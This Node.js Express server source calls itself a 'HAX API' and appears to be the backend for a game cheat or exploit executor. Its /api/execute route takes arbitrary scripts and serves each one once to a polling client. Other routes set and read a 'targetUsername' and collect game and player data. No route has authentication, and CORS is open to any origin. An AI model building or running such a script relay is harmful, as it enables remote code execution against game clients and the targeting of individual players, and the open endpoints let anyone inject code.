const express = require('express');
const app = express();

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.use(express.json({ limit: '10mb' }));
app.use(express.text({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

let latestScript = "";
let gamesData = [];
let globalPlayers = 0;
let targetUsername = "";

app.get('/api/test', (req, res) => {
    res.json({ status: 'online', games: gamesData.length, players: globalPlayers, target: targetUsername });
});

app.post('/api/execute', (req, res) => {
    latestScript = req.body || "";
    res.send('OK');
});

app.get('/api/execute', (req, res) => {
    res.send(latestScript);
    latestScript = "";
});

app.post('/api/games/update', (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const allGames = data.games || [];
        gamesData = allGames.filter(g => parseInt(g.players) > 0);
        globalPlayers = data.globalPlayers || 0;
        res.send('OK');
    } catch {
        res.send('OK');
    }
});

app.get('/api/games', (req, res) => {
    res.json({ total: gamesData.length, players: globalPlayers, games: gamesData });
});

app.post('/api/setuser', (req, res) => {
    targetUsername = req.body || "";
    res.send('OK');
});

app.get('/api/getuser', (req, res) => {
    res.send(targetUsername);
});

app.get('/', (req, res) => {
    res.send('HAX API Running');
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Server running on port ${port}`));
